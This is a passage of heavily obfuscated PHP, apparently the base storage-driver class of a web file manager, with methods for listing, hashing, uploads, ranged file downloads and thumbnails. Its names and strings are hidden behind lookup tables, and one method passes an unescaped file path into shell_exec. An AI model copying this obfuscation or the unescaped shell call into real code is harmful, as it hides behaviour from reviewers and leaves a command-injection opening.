public function exist($ÇÔáÍ–) { } public function findByHash($¥Õî²Ì™ = '', $è¬º€Ğ = '') { return !1; } public function isFile($Ë‡ìéÃµ) { } public function isFolder($ĞëÎÙ‘) { } public function size($°¸­³Ôó) { } public function info($ÜÁ¨ç‡û) { } public function infoSimple($ûÕ¶ò·—) { return $this->info($ûÕ¶ò·—); } public function infoAuth($¿Ê›±Ñø) { return $this->info($¿Ê›±Ñø); } public function infoFull($‰Õ¯¹’¨) { return $this->info($‰Õ¯¹’¨); } public function infoFullSimple($È˜Ì¨©) { return $this->info($È˜Ì¨©); } public function infoWithChildren($ñ¿¼¥î³) { $¤“Î«­ =& $_SERVER[ •ŒÓîÆ]; static $€‹µÌ¬â = array(); if (isset($€‹µÌ¬â[$ñ¿¼¥î³])) { return $€‹µÌ¬â[$ñ¿¼¥î³]; } $ÆØ¹¬¨ˆ = $this->info($ñ¿¼¥î³); if ($ÆØ¹¬¨ˆ && $ÆØ¹¬¨ˆ[$¤“Î«­[33]] == $¤“Î«­[77]) { $¢¸Áõù³ = array($¤“Î«­[78] => 0, $¤“Î«­[79] => 0, $¤“Î«­[80] => 0); $this->infoChildren($ñ¿¼¥î³, $¢¸Áõù³); $ÆØ¹¬¨ˆ[$¤“Î«­[78]] = $¢¸Áõù³[$¤“Î«­[78]]; $ÆØ¹¬¨ˆ[$¤“Î«­[81]] = array($¤“Î«­[82] => $¢¸Áõù³[$¤“Î«­[79]], $¤“Î«­[83] => $¢¸Áõù³[$¤“Î«­[80]]); $€‹µÌ¬â[$ñ¿¼¥î³] = $ÆØ¹¬¨ˆ; } return $ÆØ¹¬¨ˆ; } public function listPath($ÖšÎŠî¶, $èØ°õéš = false) { } public function has($óŠÅ„ , $íÓÏã£• = false, $—–÷ÊÛ· = false) { } public function canRead($±•âƒŒÜ) { } public function canWrite($¨‰¶Òğ€) { } public function getContent($âà´Í“„) { } public function setContent($Ş†À°É’, $¯®¦Ã = '') { } protected function infoChildren($‡Êšòıö, &$®ªûøÉ­) { $õ°·¦´î =& $_SERVER[ •ŒÓîÆ]; check_abort_echo(); $šüÍ’‚Ü = $this->listPath($‡Êšòıö, !0); $šüÍ’‚Ü = array_merge($šüÍ’‚Ü[$õ°·¦´î[84]], $šüÍ’‚Ü[$õ°·¦´î[85]]); foreach ($šüÍ’‚Ü as $ª®·˜›Ù) { if ($ª®·˜›Ù[$õ°·¦´î[33]] == $õ°·¦´î[77]) { $®ªûøÉ­[$õ°·¦´î[80]]++; $×üô£ØÃ = $this->getPathInner($ª®·˜›Ù[$õ°·¦´î[86]]); $this->infoChildren($×üô£ØÃ, $®ªûøÉ­); } else { $®ªûøÉ­[$õ°·¦´î[79]]++; $®ªûøÉ­[$õ°·¦´î[78]] += $ª®·˜›Ù[$õ°·¦´î[78]]; } } } public function fileSubstr($¡ğº€, $ÉïÑí, $Ÿ¯—×„•) { } public function listAll($ŒáŠ¸…²) { } public function listAllMake($’Æ¥Ÿ©ğ, &$¯ĞØ×¯æ) { $í°ÆÙß‰ =& $_SERVER[ •ŒÓîÆ]; check_abort_echo(); $–“ô¬Ô = $this->listPath($’Æ¥Ÿ©ğ, !0); if (!$–“ô¬Ô) { return; } $µ‘º•£¸ = array_merge($–“ô¬Ô[$í°ÆÙß‰[84]], $–“ô¬Ô[$í°ÆÙß‰[85]]); foreach ($µ‘º•£¸ as $»ƒƒ£¹) { $à§á½Ÿñ = $»ƒƒ£¹[$í°ÆÙß‰[33]] == $í°ÆÙß‰[77]; $×Ê¶Íûª = array($í°ÆÙß‰[86] => $»ƒƒ£¹[$í°ÆÙß‰[86]], $í°ÆÙß‰[77] => $à§á½Ÿñ); if (isset($»ƒƒ£¹[$í°ÆÙß‰[78]])) { $×Ê¶Íûª[$í°ÆÙß‰[78]] = $»ƒƒ£¹[$í°ÆÙß‰[78]]; } if (isset($»ƒƒ£¹[$í°ÆÙß‰[87]])) { $×Ê¶Íûª[$í°ÆÙß‰[87]] = $»ƒƒ£¹[$í°ÆÙß‰[87]]; } if (!$à§á½Ÿñ) { $¯ĞØ×¯æ[] = $×Ê¶Íûª; continue; } $¯ĞØ×¯æ[] = $×Ê¶Íûª; $‘’‘•Ú = $»ƒƒ£¹[$í°ÆÙß‰[86]]; $¨ç±Ş² = $this->pathDriver; if (substr($»ƒƒ£¹[$í°ÆÙß‰[86]], 0, strlen($¨ç±Ş²)) == $¨ç±Ş²) { $‘’‘•Ú = substr($‘’‘•Ú, strlen($¨ç±Ş²)); } $this->listAllMake($‘’‘•Ú, $¯ĞØ×¯æ); } } public function listAllSimple($ŒÚ‚Õıù, $™“ƒŠÙ = false) { $™ªù¢í½ = $this->listAll($ŒÚ‚Õıù); return $this->listAllSimpleMake($™ªù¢í½, $this->getPathOuter($ŒÚ‚Õıù), $™“ƒŠÙ); } public function listAllSimpleMake($Íì¸›«, $ˆÁ€‚™, $œûœ£òÓ) { $ŞÖÀÏòì =& $_SERVER[ •ŒÓîÆ]; $¤Üó¢û• = array(); $ˆÁ€‚™ = rtrim(get_path_father($ˆÁ€‚™), $ŞÖÀÏòì[8]) . $ŞÖÀÏòì[8]; foreach ($Íì¸›« as $ûıõå…â) { $“½İÆÆÁ = array($ŞÖÀÏòì[86] => $ûıõå…â[$ŞÖÀÏòì[86]], $ŞÖÀÏòì[88] => $ûıõå…â[$ŞÖÀÏòì[86]], $ŞÖÀÏòì[77] => $ûıõå…â[$ŞÖÀÏòì[77]]); if (isset($ûıõå…â[$ŞÖÀÏòì[78]]) && !$ûıõå…â[$ŞÖÀÏòì[77]]) { $“½İÆÆÁ[$ŞÖÀÏòì[78]] = $ûıõå…â[$ŞÖÀÏòì[78]]; } if (isset($ûıõå…â[$ŞÖÀÏòì[87]])) { $“½İÆÆÁ[$ŞÖÀÏòì[87]] = $ûıõå…â[$ŞÖÀÏòì[87]]; } if (is_array($ûıõå…â[$ŞÖÀÏòì[89]])) { $“½İÆÆÁ[$ŞÖÀÏòì[88]] = $ûıõå…â[$ŞÖÀÏòì[89]][$ŞÖÀÏòì[86]]; $“½İÆÆÁ[$ŞÖÀÏòì[78]] = $ûıõå…â[$ŞÖÀÏòì[89]][$ŞÖÀÏòì[78]]; $“½İÆÆÁ[$ŞÖÀÏòì[87]] = $ûıõå…â[$ŞÖÀÏòì[89]][$ŞÖÀÏòì[87]]; } else { if (substr($ûıõå…â[$ŞÖÀÏòì[86]], 0, strlen($ˆÁ€‚™)) == $ˆÁ€‚™) { $“½İÆÆÁ[$ŞÖÀÏòì[86]] = substr($ûıõå…â[$ŞÖÀÏòì[86]], strlen($ˆÁ€‚™)); } } $Ğ†¨™—ä = $ûıõå…â[$ŞÖÀÏòì[77]] ? $ŞÖÀÏòì[8] : $ŞÖÀÏòì[12]; $“½İÆÆÁ[$ŞÖÀÏòì[88]] = rtrim($“½İÆÆÁ[$ŞÖÀÏòì[88]], $ŞÖÀÏòì[8]) . $Ğ†¨™—ä; $“½İÆÆÁ[$ŞÖÀÏòì[86]] = $ŞÖÀÏòì[8] . trim($“½İÆÆÁ[$ŞÖÀÏòì[86]], $ŞÖÀÏòì[8]) . $Ğ†¨™—ä; if (!$œûœ£òÓ) { $À ë¬¨ = explode($ŞÖÀÏòì[8], trim($“½İÆÆÁ[$ŞÖÀÏòì[86]], $ŞÖÀÏòì[8])); $“½İÆÆÁ[$ŞÖÀÏòì[86]] = $ŞÖÀÏòì[8] . implode($ŞÖÀÏòì[8], array_slice($À ë¬¨, 1)) . $Ğ†¨™—ä; } $¤Üó¢û•[] = $“½İÆÆÁ; } return array_sort_by($¤Üó¢û•, $ŞÖÀÏòì[86]); } public function upload($‹©¹¥ù°, $ğ‹”Š£, $ğÕûÀÛª = false, $°“Óöêì = REPEAT_REPLACE) { } public function uploadFileByID($’ˆªÉ¦, $‘ñÛ»³ã, $·–÷¶œ¢) { } public function uploadFileByPath($§×ÀÊŒÎ, $Ñ¥Ôúª, $ƒ´ƒÆ‡ = array()) { } public function isUploadServer() { $¤Æ”íî³ =& $_SERVER[ •ŒÓîÆ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¤Æ”íî³[90]) { return !0; } return $GLOBALS[$¤Æ”íî³[6]][$¤Æ”íî³[91]][$¤Æ”íî³[92]]; } public function isFileOutServer() { $Ûş¢¢µ =& $_SERVER[ •ŒÓîÆ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ûş¢¢µ[90]) { return !0; } return $GLOBALS[$Ûş¢¢µ[6]][$Ûş¢¢µ[91]][$Ûş¢¢µ[93]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($šŒ÷‰èı) { $Ò‹ˆì ı =& $_SERVER[ •ŒÓîÆ]; if (!$this->isCdnHost()) { return $šŒ÷‰èı; } return str_replace(trim(get_url_root($šŒ÷‰èı), $Ò‹ˆì ı[8]), trim($this->cdnHost, $Ò‹ˆì ı[8]), $šŒ÷‰èı); } public function uploadLink($¡şëİÒÑ, $â‡™öŞ = 0) { $¾Êš =& $_SERVER[ •ŒÓîÆ]; if ($this->isUploadServer()) { return; } $èßı‰‘“ = $this->getType(); if (!in_array($èßı‰‘“, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $»ÊÉçÇ¡ = 1024 * 1024 * 10; $Ê¿êĞ£÷ = $â‡™öŞ <= $»ÊÉçÇ¡ ? $¾Êš[94] : $¾Êš[95]; $ºéşå¡ = (!$â‡™öŞ ? 1 : ceil($â‡™öŞ / pow(1024, 3))) * 3600 * 4; $ÜÁéªÜÆ = $this->{$Ê¿êĞ£÷}($¡şëİÒÑ, $ºéşå¡); if ($ÜÁéªÜÆ) { $ÜÁéªÜÆ[$¾Êš[96]] = $¡şëİÒÑ; $ÜÁéªÜÆ[$¾Êš[97]] = $èßı‰‘“; } return $ÜÁéªÜÆ; } public function uploadFormData($ËÄ¨Çöã, $¯­¢£ÔÇ = 3600) { } public function multiUploadFormData($·éßšÇ¤, $ú…ŒäÁŒ = 3600) { } public function download($Ğ½¼¢ëí, $è·åÙâ¯) { } public function ext($§â·ì½») { $Ï¥„é¤ø =& $_SERVER[ •ŒÓîÆ]; if (strpos($§â·ì½», $Ï¥„é¤ø[8]) === -1) { $ûçÎ¸Ó½ = $§â·ì½»; } else { $ûçÎ¸Ó½ = $this->pathThis($§â·ì½»); } $ĞïàÈëÉ = $Ï¥„é¤ø[12]; if (strstr($ûçÎ¸Ó½, $Ï¥„é¤ø[10])) { $ĞïàÈëÉ = substr($ûçÎ¸Ó½, strrpos($ûçÎ¸Ó½, $Ï¥„é¤ø[10]) + 1); $ĞïàÈëÉ = strtolower($ĞïàÈëÉ); } if (strlen($ĞïàÈëÉ) > 3 && preg_match($Ï¥„é¤ø[98], $ĞïàÈëÉ, $Æú‘°½¸)) { $ĞïàÈëÉ = $Ï¥„é¤ø[12]; } return $ĞïàÈëÉ; } public function pathThis($ÔïãÕ¼Ó) { $İ­¸ì‡è =& $_SERVER[ •ŒÓîÆ]; $ÔïãÕ¼Ó = str_replace($İ­¸ì‡è[99], $İ­¸ì‡è[8], rtrim($ÔïãÕ¼Ó, $İ­¸ì‡è[8])); $šÕ¿‡â¢ = strrpos($ÔïãÕ¼Ó, $İ­¸ì‡è[8]); if ($šÕ¿‡â¢ === !1) { return $ÔïãÕ¼Ó; } return substr($ÔïãÕ¼Ó, $šÕ¿‡â¢ + 1); } public function pathFather($õÃŸäú—) { $äíÜ‹ÄÁ =& $_SERVER[ •ŒÓîÆ]; $õÃŸäú— = str_replace($äíÜ‹ÄÁ[99], $äíÜ‹ÄÁ[8], rtrim($õÃŸäú—, $äíÜ‹ÄÁ[8])); $çÙç˜Äí = strrpos($õÃŸäú—, $äíÜ‹ÄÁ[8]); if ($çÙç˜Äí === !1) { return $äíÜ‹ÄÁ[12]; } return substr($õÃŸäú—, 0, $çÙç˜Äí + 1); } public function hashSimple($ô©ˆøåª) { $»éëˆÒì =& $_SERVER[ •ŒÓîÆ]; if (!$ô©ˆøåª) { return md5($»éëˆÒì[12]); } $™ˆ‡Ôº = $this->size($ô©ˆøåª); $Ñ ™ìªâ = 200; $°ğµ¸ = 50; if ($™ˆ‡Ôº <= $Ñ ™ìªâ * $°ğµ¸) { return $this->hashMd5($ô©ˆøåª) . $™ˆ‡Ôº; } $ş²ãÑô = intval($™ˆ‡Ôº / $°ğµ¸); $£ÊëˆÊè = $»éëˆÒì[12]; for ($ÔÅóã’£ = 0; $ÔÅóã’£ < $°ğµ¸; $ÔÅóã’£++) { $£ÊëˆÊè .= $this->fileSubstr($ô©ˆøåª, $ş²ãÑô * $ÔÅóã’£, $Ñ ™ìªâ); } $£ÊëˆÊè .= $this->fileSubstr($ô©ˆøåª, $™ˆ‡Ôº - $Ñ ™ìªâ, $Ñ ™ìªâ); return md5($£ÊëˆÊè) . $™ˆ‡Ôº; } public static $md5Cache = array(); public function hashMd5($Í£ÉŠØ•) { if (!$Í£ÉŠØ•) { return md5($_SERVER[ •ŒÓîÆ][12]); } $Í£ÉŠØ• = $this->iconvSystem($Í£ÉŠØ•); if (isset(self::$md5Cache[$Í£ÉŠØ•])) { return self::$md5Cache[$Í£ÉŠØ•]; } self::$md5Cache[$Í£ÉŠØ•] = $this->hashMd5Shell($Í£ÉŠØ•); if (!self::$md5Cache[$Í£ÉŠØ•]) { self::$md5Cache[$Í£ÉŠØ•] = @md5_file($Í£ÉŠØ•); } return self::$md5Cache[$Í£ÉŠØ•]; } private function hashMd5Shell($¦¾”ğï) { $®®˜£”· =& $_SERVER[ •ŒÓîÆ]; if (!$¦¾”ğï) { return md5($®®˜£”·[12]); } if (!function_exists($®®˜£”·[100])) { return !1; } $„‰ˆà¡ = array($®®˜£”·[101], $®®˜£”·[102]); $ù—ó¿ä = Cache::get($®®˜£”·[103]); if (!$ù—ó¿ä) { $¹×íšëÉ = BASIC_PATH . $®®˜£”·[104]; $×ûÃ©ã = md5_file($¹×íšëÉ); $ù—ó¿ä = $®®˜£”·[105]; foreach ($„‰ˆà¡ as $ğëĞ—Ú) { $ÚŸÄ”ü = shell_exec($ğëĞ—Ú . "\40\x22{$¹×íšëÉ}\42"); if ($ÚŸÄ”ü && substr(trim($ÚŸÄ”ü), 0, 32) == $×ûÃ©ã) { $ù—ó¿ä = $ğëĞ—Ú; break; } } Cache::set($®®˜£”·[103], $ù—ó¿ä, 3600); } if ($ù—ó¿ä == $®®˜£”·[105]) { return !1; } $ÚŸÄ”ü = shell_exec($ù—ó¿ä . "\40\x22{$¦¾”ğï}\42"); $ÚŸÄ”ü = str_replace($®®˜£”·[106], $®®˜£”·[12], $ÚŸÄ”ü); return substr($ÚŸÄ”ü, 0, 32); } public function link($æŒşÌŸ²) { return $æŒşÌŸ²; } public function fileOut($¸•¦Å°™, $şÄßÎÈÊ = false, $µûƒÑÛ = false, $‡Í£¾à = '') { $šÃÁíâÔ =& $_SERVER[ •ŒÓîÆ]; $this->cacheMethod(null, null); if (!$¸•¦Å°™ || !$this->exist($¸•¦Å°™)) { show_json(LNG($šÃÁíâÔ[107]), !1, $µûƒÑÛ); } $œ·™ôœè = $this->getType() == $šÃÁíâÔ[108]; $ßãÑÌÃ¡ = $GLOBALS[$šÃÁíâÔ[6]][$šÃÁíâÔ[91]][$šÃÁíâÔ[109]][$šÃÁíâÔ[110]]; $î¿¢‘Ş = (double) $GLOBALS[$šÃÁíâÔ[6]][$šÃÁíâÔ[91]][$šÃÁíâÔ[109]][$šÃÁíâÔ[111]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $°¯©Ø®ï = $this->infoFull($¸•¦Å°™); $ÏÕ¥Ø× = $°¯©Ø®ï[$šÃÁíâÔ[78]]; $šÁìë«Ğ = gmdate($šÃÁíâÔ[112], $°¯©Ø®ï[$šÃÁíâÔ[87]]); $ÛÃİº¬À = $µûƒÑÛ ? $µûƒÑÛ : $this->iconvApp($°¯©Ø®ï[$šÃÁíâÔ[32]]); $ÈöÑ¿µ¶ = 0; $¬—ı¢“ = $ÏÕ¥Ø× - 1; $ŠÉ«ùòÇ = $this->ext($ÛÃİº¬À); if (in_array($ŠÉ«ùòÇ, array($šÃÁíâÔ[113], $šÃÁíâÔ[114], $šÃÁíâÔ[115], $šÃÁíâÔ[116]))) { $ŠÉ«ùòÇ = $šÃÁíâÔ[117]; } if (in_array($ŠÉ«ùòÇ, array($šÃÁíâÔ[118]))) { $ŠÉ«ùòÇ = $šÃÁíâÔ[119]; } if (!$‡Í£¾à) { $‡Í£¾à = md5($šÁìë«Ğ . $ÏÕ¥Ø×); } $‡Í£¾à = $šÃÁíâÔ[120] . $‡Í£¾à . $šÃÁíâÔ[120]; $…‹ƒ‡àí = get_file_mime($ŠÉ«ùòÇ); $øôŸÖŸÔ = !0; $øôŸÖŸÔ = isset($_GET[$šÃÁíâÔ[121]]) ? !1 : !0; if ($şÄßÎÈÊ === !1 && !mime_support($…‹ƒ‡àí)) { $…‹ƒ‡àí = $šÃÁíâÔ[122]; } header($šÃÁíâÔ[123]); header($šÃÁíâÔ[124] . $…‹ƒ‡àí); $áÀ•ìÙæ = rawurlencode($ÛÃİº¬À); $áÀ•ìÙæ = $šÃÁíâÔ[120] . $áÀ•ìÙæ . $šÃÁíâÔ[125] . $áÀ•ìÙæ; if ($şÄßÎÈÊ) { header($šÃÁíâÔ[126]); header($šÃÁíâÔ[127] . $áÀ•ìÙæ); } else { if ($øôŸÖŸÔ) { header($šÃÁíâÔ[128] . $áÀ•ìÙæ); } } header($šÃÁíâÔ[129] . gmdate($šÃÁíâÔ[112], time() + 3600 * 24 * 30) . $šÃÁíâÔ[130]); header($šÃÁíâÔ[131]); header($šÃÁíâÔ[132]); header($šÃÁíâÔ[133]); if (isset($_SERVER[$šÃÁíâÔ[134]]) && strtotime($_SERVER[$šÃÁíâÔ[134]]) == $°¯©Ø®ï[$šÃÁíâÔ[87]]) { header($šÃÁíâÔ[135], !0, 304); die; } if (isset($_SERVER[$šÃÁíâÔ[136]]) && $_SERVER[$šÃÁíâÔ[136]] == $‡Í£¾à) { header($šÃÁíâÔ[137] . $‡Í£¾à, !0, 304); die; } header($šÃÁíâÔ[137] . $‡Í£¾à); header($šÃÁíâÔ[138] . $šÁìë«Ğ . $šÃÁíâÔ[130]); header($šÃÁíâÔ[139] . $ÛÃİº¬À); header($šÃÁíâÔ[140]); header($šÃÁíâÔ[141] . $ÏÕ¥Ø×); header($šÃÁíâÔ[142]); Hook::trigger($šÃÁíâÔ[143], $¸•¦Å°™, $ÏÕ¥Ø×, $ÛÃİº¬À, $ŠÉ«ùòÇ); if (!$şÄßÎÈÊ && $ŠÉ«ùòÇ == $šÃÁíâÔ[144]) { if ($ÏÕ¥Ø× > 1024 * 1024 * 5) { die; } $ˆ¨‡€’‚ = $this->getContent($¸•¦Å°™); $ˆ¨‡€’‚ = Html::clearSVG($ˆ¨‡€’‚); header($šÃÁíâÔ[145] . strlen($ˆ¨‡€’‚)); echo $ˆ¨‡€’‚; die; } $òª¼áÆÔ = strtolower($_SERVER[$šÃÁíâÔ[146]]); if ($œ·™ôœè && $òª¼áÆÔ && $ßãÑÌÃ¡) { if (strstr($òª¼áÆÔ, $šÃÁíâÔ[147])) { header($šÃÁíâÔ[148] . $¸•¦Å°™); } else { if (strstr($òª¼áÆÔ, $šÃÁíâÔ[149])) { header($šÃÁíâÔ[150] . $¸•¦Å°™); } else { if (strstr($òª¼áÆÔ, $šÃÁíâÔ[151])) { header($šÃÁíâÔ[152] . $¸•¦Å°™); } } } if ($î¿¢‘Ş) { header($šÃÁíâÔ[153] . $î¿¢‘Ş); } return; } if (isset($_SERVER[$šÃÁíâÔ[154]])) { if (preg_match($šÃÁíâÔ[155], $_SERVER[$šÃÁíâÔ[154]], $ÑŞ¬¶í†)) { $ÈöÑ¿µ¶ = intval($ÑŞ¬¶í†[1]); $ÈöÑ¿µ¶ = $ÈöÑ¿µ¶ <= 0 ? 0 : ($ÈöÑ¿µ¶ >= $¬—ı¢“ ? $¬—ı¢“ : $ÈöÑ¿µ¶); if (!empty($ÑŞ¬¶í†[2])) { $ŒÙµÔ›­ = intval($ÑŞ¬¶í†[2]); $¬—ı¢“ = $ŒÙµÔ›­ < $ÈöÑ¿µ¶ ? $ÈöÑ¿µ¶ : ($ŒÙµÔ›­ >= $¬—ı¢“ ? $¬—ı¢“ : $ŒÙµÔ›­); } } header($šÃÁíâÔ[156]); header("\x43\157\x6e\164\x65\156\x74\x2d\x52\141\x6e\147\x65\72\x20\x62\x79\x74\x65\163\x20{$ÈöÑ¿µ¶}\x2d{$¬—ı¢“}\x2f" . $ÏÕ¥Ø×); } else { header($šÃÁíâÔ[157]); } header($šÃÁíâÔ[158]); $÷¡©‰¹ı = !0; if ($_SERVER[$šÃÁíâÔ[159]] == $šÃÁíâÔ[160] && $ÏÕ¥Ø× > 1204 * 1024 * 1024 * 2) { $÷¡©‰¹ı = !1; } if ($÷¡©‰¹ı) { header($šÃÁíâÔ[161] . ($¬—ı¢“ - $ÈöÑ¿µ¶ + 1)); } if ($_SERVER[$šÃÁíâÔ[162]] == $šÃÁíâÔ[163]) { return; } $ÎÃ‚‹—é = 1024 * 100; $°ğÂ€Øº = 0; if ($î¿¢‘Ş) { $°ğÂ€Øº = intval(1000 * 1000 * ($ÎÃ‚‹—é / $î¿¢‘Ş)); } while ($ÈöÑ¿µ¶ <= $¬—ı¢“) { $¡£±†¡˜ = timeFloat(); check_abort(); $Ğø·Æğ = $¬—ı¢“ - $ÈöÑ¿µ¶ + 1; if ($Ğø·Æğ <= $ÎÃ‚‹—é) { $ÎÃ‚‹—é = $Ğø·Æğ; } echo $this->fileSubstr($¸•¦Å°™, $ÈöÑ¿µ¶, $ÎÃ‚‹—é); $ÈöÑ¿µ¶ += $ÎÃ‚‹—é; if ($ÎÃ‚‹—é == $Ğø·Æğ) { $ÈöÑ¿µ¶ = $¬—ı¢“ + 1; } if ($°ğÂ€Øº) { $µÓü¢³ = intval(1000 * 1000 * (timeFloat() - $¡£±†¡˜)); $€úıÆ¹ä = $°ğÂ€Øº - $µÓü¢³; if ($€úıÆ¹ä > 5) { usleep($€úıÆ¹ä); } } } } public function fileOutServer($÷İÍ®´ê, $ÃÜ±ûÀÚ = false, $Åßü®¢ = false, $ÆÏş«¼« = '') { $this->fileOut($÷İÍ®´ê, $ÃÜ±ûÀÚ, $Åßü®¢, $ÆÏş«¼«); } public function fileOutLink($æôŠå´‘) { header($_SERVER[ •ŒÓîÆ][164] . $æôŠå´‘); die; } public function cacheMethod($²”¤²×ï, $Ä“³Ú°î, $Í‘ó€´İ = null) { $âõ ³Ó¼ =& $_SERVER[ •ŒÓîÆ]; static $ÚŞÂ¶“À = array(); $²ùÒäŸ = $Ä“³Ú°î ? ltrim($this->getPathOuter($Ä“³Ú°î), $âõ ³Ó¼[8]) : $âõ ³Ó¼[12]; $™÷µŞÈï = $âõ ³Ó¼[165] . $²”¤²×ï . $âõ ³Ó¼[166] . rtrim($²ùÒäŸ, $âõ ³Ó¼[8]); if (is_null($²”¤²×ï)) { $ÚŞÂ¶“À = array(); return; } if (is_null($Ä“³Ú°î)) { foreach ($ÚŞÂ¶“À as $™÷µŞÈï => $ñÖŸØÜƒ) { if (!strstr($™÷µŞÈï, $âõ ³Ó¼[165] . $²”¤²×ï . $âõ ³Ó¼[167])) { continue; } unset($ÚŞÂ¶“À[$™÷µŞÈï]); } return; } if (!is_null($Í‘ó€´İ)) { $ÚŞÂ¶“À[$™÷µŞÈï] = $Í‘ó€´İ; return; } $ßÅ“ê·ä = isset($ÚŞÂ¶“À[$™÷µŞÈï]) ? $ÚŞÂ¶“À[$™÷µŞÈï] : null; if (!is_null($ßÅ“ê·ä)) { return $ßÅ“ê·ä; } $ßÅ“ê·ä = $this->{$²”¤²×ï}($Ä“³Ú°î); $ÚŞÂ¶“À[$™÷µŞÈï] = $ßÅ“ê·ä; return $ßÅ“ê·ä; } public function cacheMethodInfoSet($ñğ¨Ìƒº, $éşÊ×ÑÜ, $ëì«Êëñ = false) { $Ç™÷êª¡ =& $_SERVER[ •ŒÓîÆ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ç™÷êª¡[168], $ñğ¨Ìƒº, $éşÊ×ÑÜ); $this->cacheMethod($Ç™÷êª¡[169], $ñğ¨Ìƒº, $éşÊ×ÑÜ ? !1 : !0); if (is_array($ëì«Êëñ)) { $this->cacheMethod($Ç™÷êª¡[170], $ñğ¨Ìƒº, $ëì«Êëñ); } } public function fileOutImage($•Õ²‘ë, $äÖş•¸ = 250) { $ŠùşàÈå =& $_SERVER[ •ŒÓîÆ]; set_timeout(); if (substr($•Õ²‘ë, 0, 4) == $ŠùşàÈå[151]) { $this->fileOutLink($•Õ²‘ë); } $†·ÖÏÕ = $this->info($•Õ²‘ë); $¨¿µ®ì· = !1; $§í‡ü¹… = isset($GLOBALS[$ŠùşàÈå[171]]) ? $GLOBALS[$ŠùşàÈå[171]] : array(); if ($§í‡ü¹… && $§í‡ü¹…[$ŠùşàÈå[172]] == $†·ÖÏÕ[$ŠùşàÈå[86]]) { $†·ÖÏÕ = $§í‡ü¹…; $çŞ¤Æ£Ï = $†·ÖÏÕ[$ŠùşàÈå[173]]; if ($çŞ¤Æ£Ï && isset($çŞ¤Æ£Ï[$ŠùşàÈå[174]])) { if ($çŞ¤Æ£Ï[$ŠùşàÈå[174]] <= $äÖş•¸ && $çŞ¤Æ£Ï[$ŠùşàÈå[175]] <= $äÖş•¸) { $¨¿µ®ì· = !0; } } } if ($†·ÖÏÕ[$ŠùşàÈå[78]] <= 1024 * 50 || $¨¿µ®ì· || !function_exists($ŠùşàÈå[176]) || $†·ÖÏÕ[$ŠùşàÈå[177]] == $ŠùşàÈå[178]) { return $this->fileOut($•Õ²‘ë, !1, $†·ÖÏÕ[$ŠùşàÈå[32]]); } $õ·Å„˜¹ = kodIO::hashPath($†·ÖÏÕ); $á—õøá = "\x63\x6f\166\x65\162\x5f{$õ·Å„˜¹}\x5f{$äÖş•¸}\56\160\x6e\147"; $ì¦Èî›› = IO_PATH_SYSTEM_TEMP . $ŠùşàÈå[179]; $À¸«©ıı = IO::infoFullSimple($ì¦Èî››); $„›¼şıç = $À¸«©ıı && is_array($À¸«©ıı) ? $À¸«©ıı[$ŠùşàÈå[86]] : $ŠùşàÈå[12]; if (!$„›¼şıç) { $„›¼şıç = IO::mkdir($ì¦Èî››); } if ($†·ÖÏÕ[$ŠùşàÈå[180]] == $ŠùşàÈå[181] && isset($†·ÖÏÕ[$ŠùşàÈå[182]]) && $†·ÖÏÕ[$ŠùşàÈå[182]] == kodIO::sourceID($„›¼şıç)) { $–Ù‡¢ÌÃ = $†·ÖÏÕ[$ŠùşàÈå[183]]; if ($äÖş•¸ <= 500) { $†’úã•á = preg_replace($ŠùşàÈå[184], $ŠùşàÈå[185], $†·ÖÏÕ[$ŠùşàÈå[32]]); $–Ù‡¢ÌÃ = IO::fileNameExist($„›¼şıç, $†’úã•á); } return IO::fileOut(KodIO::make($–Ù‡¢ÌÃ), !1, $†·ÖÏÕ[$ŠùşàÈå[32]]); } $øÍÎøÉõ = IO::fileNameExist($„›¼şıç, $á—õøá); if ($øÍÎøÉõ) { return IO::fileOut(KodIO::make($øÍÎøÉõ), !1, $†·ÖÏÕ[$ŠùşàÈå[32]]); } if ($äÖş•¸ > 1000) { $this->makeImageCover($„›¼şıç, $•Õ²‘ë, $á—õøá, $äÖş•¸); $this->makeImageCover($„›¼şıç, $•Õ²‘ë, "\143\x6f\166\145\162\137{$õ·Å„˜¹}\137\62\x35\x30\x2e\x70\x6e\x67", 250); $øÍÎøÉõ = IO::fileNameExist($„›¼şıç, $á—õøá); if ($øÍÎøÉõ) { return IO::fileOut(KodIO::make($øÍÎøÉõ), !1, $†·ÖÏÕ[$ŠùşàÈå[32]]); } die; } $œçá½¹ = Cache::get($á—õøá); if ($œçá½¹ == $ŠùşàÈå[186] || $œçá½¹ == $ŠùşàÈå[187]) { echo $œçá½¹; die; } Cache::set($á—õøá, $ŠùşàÈå[187], 60); $Œò»÷ü = array($„›¼şıç, $†·ÖÏÕ[$ŠùşàÈå[86]], $á—õøá, $äÖş•¸); $æµ‹‰Î¤ = $ŠùşàÈå[188] . $†·ÖÏÕ[$ŠùşàÈå[78]] . $ŠùşàÈå[189] . $á—õøá . $ŠùşàÈå[190] . $†·ÖÏÕ[$ŠùşàÈå[32]] . $ŠùşàÈå[191] . $†·ÖÏÕ[$ŠùşàÈå[86]]; TaskQueue::add($ŠùşàÈå[192], $Œò»÷ü, $æµ‹‰Î¤, $á—õøá); } public function makeImageCover($ãÎ’¹êÛ, $åÃí”©, $¸Ğø´¢‚, $®ÉÍÅ©•) { $ñ•ÅÊ± =& $_SERVER[ •ŒÓîÆ]; if (IO::fileNameExist($ãÎ’¹êÛ, $¸Ğø´¢‚)) { return $ñ•ÅÊ±[193]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Œ³˜üã£ = DATA_THUMB . $¸Ğø´¢‚; del_file($Œ³˜üã£); $˜ô‰ÈÓ = TEMP_FILES . $¸Ğø´¢‚; if (!@file_exists($˜ô‰ÈÓ)) { $˜ô‰ÈÓ = IO::download($åÃí”©, $˜ô‰ÈÓ); } if (!@file_exists($˜ô‰ÈÓ)) { return $ñ•ÅÊ±[194]; } ImageThumb::createThumb($˜ô‰ÈÓ, $Œ³˜üã£, $®ÉÍÅ©•, $®ÉÍÅ©• * 10); if (@file_exists($Œ³˜üã£)) { Cache::remove($¸Ğø´¢‚); return IO::move($Œ³˜üã£, $ãÎ’¹êÛ); } Cache::set($¸Ğø´¢‚, 